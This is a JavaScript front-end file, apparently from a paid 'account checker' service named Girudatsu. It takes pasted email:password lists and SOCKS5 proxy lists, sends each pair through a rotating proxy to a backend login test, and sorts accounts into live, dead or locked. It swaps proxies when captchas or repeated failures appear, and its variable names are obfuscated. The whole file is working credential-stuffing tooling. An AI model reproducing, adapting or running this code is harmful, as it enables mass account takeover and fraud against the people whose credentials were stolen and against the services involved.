/* girudatsu.website
 * Ver.:	1.00
 * File:	match.js
 * Date:	
 * Desc:	Match API. Modified from http://iace.pw/stylecyb/js/acchckver.js
 * Copyright (C) 2015 Girudatsu Team (http://girudatsu.website)
 */ 
 

function check(_0x2b8bx23, _0x2b8bx24, _0x2b8bx25) {
	 // SOCKS
	if (lstMail["length"] < 1 || lstSock["length"] < 1 || _0x2b8bx23 >= lstMail["length"] || _0x2b8bx24 >= lstSock["length"]) {
		stopLoading(true);
		return false
	};
	
	
	if (_0x2b8bx25 >= maxFail && noSocks < 1) {
		updateTextBox("", lstSock[_0x2b8bx24]);
		_0x2b8bx24++;
		check(_0x2b8bx23, _0x2b8bx24, 0);
		return false
	};
	
	$("#loading").attr ("src", "http://puu.sh/njC2f/4d12705c44.gif");
	$("#checkStatus").html ("<b>Account</b>: " + lstMail[_0x2b8bx23]).effect ("highlight", {
		color: "#00ff00"
	}, 1000);
	$("#current_socks").html ("<b>socks</b>: " + lstSock[_0x2b8bx24]).effect ("highlight", {
		color: "#45DFC7"
	}, 1000);
    
    var paramma = lstMail[_0x2b8bx23];
	var account = paramma.split(delim);
	var email = $.trim(account[0]);
	var password = $.trim(account[1]);
    
    var e = document.getElementById("server");
    var server = e.options[e.selectedIndex].value;
    var socks5 = lstSock[_0x2b8bx24];
    
	var request_uri = SITE_URL + "?email=" + email + "&password=" + password + "&output=json&server=" + server  + "&socks5=" + socks5;
	$("#request_log").append ('<a href="' + request_uri + '">' + request_uri + "</a>" + "<br />");
	up("#request_count");
	
	$.ajax ({        
        url: SITE_URL,
		dataType: "json",
		type: "GET", // POST | GET
		data: {
			output: 'json',
			email: email,
			password: password,
            server: server,
            socks5: socks5
		},        
		success: function(_0x2b8bx26) {
			if (!_0x2b8bx26) {
				stopLoading(false);
				bootbox.dialog ({
					title: "Alert!",
					message: "System Failure Please Contact Admin",
					buttons: {
						success: {
							label: "OK",
							className: "btn-success"
						}
					}
				});
				return false
			};
				
			var json = _0x2b8bx26;			
			
			$("#response_log").append (JSON.stringify(json) + "<br />");
			up("#response_count");
            
			switch (_0x2b8bx26["code"]) {
				case 0: // LIVE                
					updateTextBox(lstMail[_0x2b8bx23], "");
					$("#tvmit_live").append (json.msg + "<br />");                    
                    $("#balance").html (getCookie('Girudatsu_balance'));                    
                    up("#count_all");up("#count_alls");up("#tvmit_live_count");up("#tvmit_live_counts");
					_0x2b8bx25 = 0;
					_0x2b8bx23++;
					updateProgress(_0x2b8bx23, lstMail["length"]);
					break
				case 1: // invalid parameter
					stopLoading(true);
					bootbox.dialog ({
						title: "Alert!",
						message: _0x2b8bx26["msg"],
						buttons: {
							success: {
								label: "OK",
								className: "btn-success"
							}
						}
					});
					return false;
					break;					        
                case 2:   // socks die captcha detect
					updateTextBox("", lstSock[_0x2b8bx24]);
					$("#socks-die").append (_0x2b8bx26["msg"] + "<br />");
					up(".socks-die"); 
					_0x2b8bx24++;             
                    break;
				case 3: // DIE
					updateTextBox(lstMail[_0x2b8bx23], "");
					$("#tvmit_die").append (_0x2b8bx26["msg"] + "<br />");
					up("#count_all");up("#count_alls");up("#tvmit_die_count");up("#tvmit_die_counts");
					_0x2b8bx25++;
					_0x2b8bx23++;
					updateProgress(_0x2b8bx23, lstMail["length"]);
					socksHealth--;
					console.log('socks health: '+socksHealth);
					if(socksHealth == 0)
					{							
						updateTextBox("", lstSock[_0x2b8bx24]);
						_0x2b8bx24++;             
						socksHealth = 5;
					}
					break;    
				case 4: // Locked
					updateTextBox(lstMail[_0x2b8bx23], "");
					$("#tvmit_die").append (_0x2b8bx26["msg"] + "<br />");
					up("#count_all");up("#count_alls");up("#tvmit_die_count");up("#tvmit_die_counts");
					_0x2b8bx25++;
					_0x2b8bx23++;
					updateProgress(_0x2b8bx23, lstMail["length"]);
					socksHealth--;
					console.log('socks health: '+socksHealth);
					if(socksHealth == 0)
					{							
						updateTextBox("", lstSock[_0x2b8bx24]);
						_0x2b8bx24++;             
						socksHealth = 5;
					}
					break;    
                default:   
					updateTextBox("", lstSock[_0x2b8bx24]);
					$("#tvmit_unk").append (_0x2b8bx26["msg"] + "<br />");
					up("#tvmit_unk_count");up("#count_all");up("#tvmit_unk_counts");                    
					updateTextBox("", lstSock[_0x2b8bx24]);
					_0x2b8bx24++;   
					break;
			};
			if (_0x2b8bx26["error"] != 1) {
				check(_0x2b8bx23, _0x2b8bx24, _0x2b8bx25)
			}
		},
		error: function(_0x2b8bx26, _0x2b8bx27, _0x2b8bx28) {
			if(_0x2b8bx27=="error"){stopLoading(false);var alertMessage='';if(_0x2b8bx26.status===0){alertMessage='Can\'t connect. Check your network connection';}else if(_0x2b8bx26.status==404){alertMessage='Requested page not found. [404]';}else if(_0x2b8bx26.status==500){alertMessage='Internal Server Error [500].';}else if(_0x2b8bx27==='parsererror'){alertMessage='Requested JSON parse failed.';}else if(_0x2b8bx27==='timeout'){alertMessage='Time out error.';}else if(_0x2b8bx27==='abort'){alertMessage='Ajax request aborted.';}else{alertMessage='Uncaught Error. '+_0x2b8bx26.responseText;}alert("Error! Please try again or contact admin."+"\nStatus Code: "+_0x2b8bx26.status+"\nMessage: "+alertMessage+"\nCatched error: "+_0x2b8bx28);}
		}
	});
	return true
}






$(document).ready (function() {
	$("#stop").addClass ("disabled").attr ("disabled", true).click (function() {
		stopLoading(false);
		f = "10"
	});
	$(".remove-limited").css ("cursor", "pointer").click (function() {
		$(".limited").parent ().fadeIn (100, function() {
			$(this).remove ()
		})
	});
	$("#submit").click (function() {
		delim = $("#delim").val ().trim ();
		maxFail = parseInt($("#fail").val ());
		chkChange = $("#nochange").is (":checked") ? 1 : 0;
		noSocks = $("#noSocks").val () ? 1 : 0;
		timeout = $("#timeout").val ();
		var _0x2b8bx1c = filterMP($("#mailpass").val ());
		//var _0x2b8bx2e = /[0-9a-zA-Z]+_[0-9a-zA-Z]+[_]{1}[0-9a-zA-Z]+/g;
		var _0x2b8bx2e = /\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}/g;
		
		var _0x2b8bx39 = $("#socks").val ().match (_0x2b8bx2e);
		if (_0x2b8bx39 == null) {
			bootbox.dialog ({
				title: "Alert!",
				message: "No Socks found!",
				buttons: {
					success: {
						label: "OK",
						className: "btn-success"
					}
				}
			});
			return false
		};
		
		if (_0x2b8bx1c["length"] < 1) {
			bootbox.dialog ({
				title: "Alert!",
				message: "No Account found!",
				buttons: {
					success: {
						label: "OK",
						className: "btn-success"
					}
				}
			});
			return false
		};
		$("#reset_stat").click (function() {
			var _0x2b8bx3a = confirm("Do you really want to Reset Statistic ?");
			if (_0x2b8bx3a) {
				$("#count_all").html ("0");
				$("#tvmit_live_counts").html ("0");
				$("#tvmit_die_counts").html ("0");
				$("#tvmit_unk_counts").html ("0");
				$(".progress .bar").css ("width", "0%").text ("0%");
				$("#checkStatus").text ("Idle");
				$("#percentcheck").text ("");
			}
		});
		$("#delete_table").click (function() {
			$("#count_alls").html ("0");
			//$("#cc").text ("")
		});
		$("#socks").val (_0x2b8bx39.join ("\x0A")).attr ("disabled", true);
		$("#mailpass").val (_0x2b8bx1c.join ("\x0A")).attr ("disabled", true);
		$("#result").show ();
		$("#submit").addClass ("disabled").attr ("disabled", true);
		$("#stop").removeClass ("disabled").attr ("disabled", false);
		lstMail = _0x2b8bx1c;
		lstSock = _0x2b8bx39;
		resetResult();
		updateProgress(0, lstMail["length"]);
		$("#check-progress").show ("slow");
		check(0, 0, 0);
		return false
	})
})


	/*
	
	Response Code
	
	0 = Success
	1 = Invalid paramter
    2 = Account die
    3 = Unknown problem
	
	*/